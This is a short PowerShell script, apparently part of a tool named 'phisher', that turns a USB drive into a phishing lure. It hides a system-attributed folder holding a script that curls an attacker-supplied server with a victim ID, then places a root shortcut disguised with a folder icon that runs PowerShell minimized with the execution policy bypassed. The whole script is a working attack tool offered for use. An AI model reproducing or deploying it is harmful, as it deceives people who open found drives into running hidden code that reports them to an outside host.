# Get drive letter
$DRIVE=Read-Host -Prompt "USB Drive Path. ex: 'D:\'"
$IP=Read-Host -Prompt "Location that the server is at"
$LOC=Read-Host -Prompt "Copy output of ./phisher --generate 'loc' here"

$GEN=$LOC -split ","
$ID=$GEN[0]

# Create hidden folder and it's script
$SCRIPT_LOC="$DRIVE\hidden\run.ps1"
New-Item -ItemType Directory -Force -Path "$DRIVE\hidden"
Write-Output "curl http://$IP/$ID" > $SCRIPT_LOC
attrib +r +h +s "$DRIVE\hidden"

# Create shortcut from script to root
$ws = New-Object -ComObject WScript.Shell;
$s = $ws.CreateShortcut("$DRIVE\test.lnk");
$S.TargetPath = "powershell.exe"
$S.Arguments = "-ExecutionPolicy Bypass -File $SCRIPT_LOC"
# for whatever reason 7 means minimized
$S.WindowStyle = 7
$S.IconLocation = "%SystemRoot%\System32\SHELL32.dll,3"
$S.Save();
